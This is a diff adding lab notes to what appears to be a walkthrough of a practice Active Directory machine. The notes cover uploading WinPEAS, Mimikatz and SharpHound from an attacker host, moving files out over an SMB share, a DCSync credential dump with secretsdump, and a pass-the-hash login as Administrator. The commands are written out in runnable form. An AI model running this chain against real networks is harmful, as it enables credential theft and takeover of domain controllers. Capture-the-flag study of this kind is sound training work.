@@ -106,6 +106,72 @@ which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shel
         *Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
             egotisticalbank\fsmith
 
+    We will upload WinPeas + PowerUP + Mimikatz from /Downloads
+        certutil -urlcache -f http://<KaliIP>/File fileName
+
+    We gathered some AutoLogon creds for svc account - via WinPEAS
+
+        We will check the privileges for the found accounts
+            net user /domain <userName>
+                Global Group memberships     *Domain Users
+
+        We found Nothing
+
+    AD Enumeration:
+        Let's run BloodHound:
+            certutil.exe -urlcache -f http://<KaliIP>/SharpHound.exe SharpHound.exe
+        
+        .\SharpHound.exe -c all
+        IF we receive this error message:
+            ERROR|Unable to connect to LDAP, verify your credentials
+
+            -https://github.com/BloodHoundAD/SharpHound/issues/10 Versiion PB
+
+
+        To Forward SharpHound logs to BloodHound in Kali:
+            *Evil-WinRM* PS C:\windows\tasks> download <FileName>
+        
+            OR:
+                We will enable an SMB Server on OUr Kali as the following exemple:
+                        on Kali:
+                            mkdir smb
+                            impacket-smbserver coolz $(pwd) -smb2support -user admin -password admin
+
+
+                        on Window:
+                            *Evil-WinRM* PS C:\Windows\System32> $passwd = convertto-securestring 'admin' -AsPlainText -Force
+                            *Evil-WinRM* PS C:\Windows\System32> $passwd
+                                output
+
+                            *Evil-WinRM* PS C:\Windows\System32> $cred = New-Object System.Management.Automation.PSCredential('admin', $passwd)
+                            *Evil-WinRM* PS C:\Windows\System32> $cred
+                                output 
+
+                            New-PSDrive -Name admin -PSProvider FileSystem -Credential $cred -Root \\<KaliIP>\coolz
+                            
+                            *Evil-WinRM* PS C:\> cd \\<KaliIP>\coolz
+                            .\winPEASx64.exe
+
+                *Evil-WinRM* PS C:\windows\tasks> Copy-Item "<FileName>" -Destination "\\<KaliIP>\coolz"
+
+        BloodHound show us that:
+            From svc_loanmgr we can use DCSync Attack via mimikatz to corrupt the DC Admin:
+                lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator
+
+            Exploit:
+                sudo /usr/share/doc/python3-impacket/examples/secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
+
+
+        We will use the Administrator Hash to perform a PTH Attack:
+            To check if we can access:
+                crackmapexec smb 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+
+            IF OK:
+                evil-winrm -i 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
+
+
+            
+
 
 
 
